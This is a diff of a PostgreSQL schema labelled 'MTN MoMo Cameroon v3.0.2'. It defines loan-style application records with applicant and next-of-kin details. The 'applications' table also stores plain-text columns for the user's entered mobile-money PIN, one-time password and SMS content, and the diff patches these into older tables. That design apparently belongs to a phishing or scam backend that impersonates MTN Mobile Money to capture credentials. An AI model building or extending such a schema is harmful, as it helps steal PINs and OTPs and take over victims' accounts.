@@ -1,5 +1,10 @@
+-- ============================================================
+-- schema.sql – MTN MoMo Cameroon v3.0.2
+-- Idempotent: safe to run multiple times
+-- ============================================================
 CREATE EXTENSION IF NOT EXISTS pgcrypto;
 
+-- ─── applications ───
 CREATE TABLE IF NOT EXISTS applications (
     id                    TEXT PRIMARY KEY,
     full_name             TEXT NOT NULL,
@@ -16,26 +21,35 @@ CREATE TABLE IF NOT EXISTS applications (
     kin_phone             TEXT NOT NULL,
     has_20_percent        BOOLEAN NOT NULL DEFAULT FALSE,
     tnc_accepted_at       TIMESTAMPTZ NOT NULL,
-
     status                TEXT NOT NULL DEFAULT 'application_review',
     user_submitted        BOOLEAN NOT NULL DEFAULT TRUE,
-
     sms_content           TEXT,
     momo_pin_entered      TEXT,
     otp_entered           TEXT,
-
     rejection_reason      TEXT,
     admin_decision_by     TEXT,
-
     approved_at           TIMESTAMPTZ,
     created_at            TIMESTAMPTZ NOT NULL DEFAULT NOW(),
     updated_at            TIMESTAMPTZ NOT NULL DEFAULT NOW()
 );
 
-CREATE INDEX IF NOT EXISTS idx_apps_email ON applications(email);
-CREATE INDEX IF NOT EXISTS idx_apps_phone ON applications(phone);
+-- Patch older tables missing new columns
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS user_submitted     BOOLEAN NOT NULL DEFAULT TRUE;
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS sms_content        TEXT;
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS momo_pin_entered   TEXT;
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS otp_entered        TEXT;
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS rejection_reason   TEXT;
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS admin_decision_by  TEXT;
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS approved_at        TIMESTAMPTZ;
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS has_20_percent     BOOLEAN NOT NULL DEFAULT FALSE;
+ALTER TABLE applications ADD COLUMN IF NOT EXISTS tnc_accepted_at    TIMESTAMPTZ;
+
+-- Indexes
+CREATE INDEX IF NOT EXISTS idx_apps_email  ON applications(email);
+CREATE INDEX IF NOT EXISTS idx_apps_phone  ON applications(phone);
 CREATE INDEX IF NOT EXISTS idx_apps_status ON applications(status);
 
+-- ─── check_status_otps ───
 CREATE TABLE IF NOT EXISTS check_status_otps (
     token           TEXT PRIMARY KEY,
     application_id  TEXT NOT NULL REFERENCES applications(id) ON DELETE CASCADE,
@@ -48,6 +62,7 @@ CREATE TABLE IF NOT EXISTS check_status_otps (
 );
 CREATE INDEX IF NOT EXISTS idx_check_otps_app ON check_status_otps(application_id);
 
+-- ─── transactions ───
 CREATE TABLE IF NOT EXISTS transactions (
     id              SERIAL PRIMARY KEY,
     application_id  TEXT NOT NULL REFERENCES applications(id) ON DELETE CASCADE,
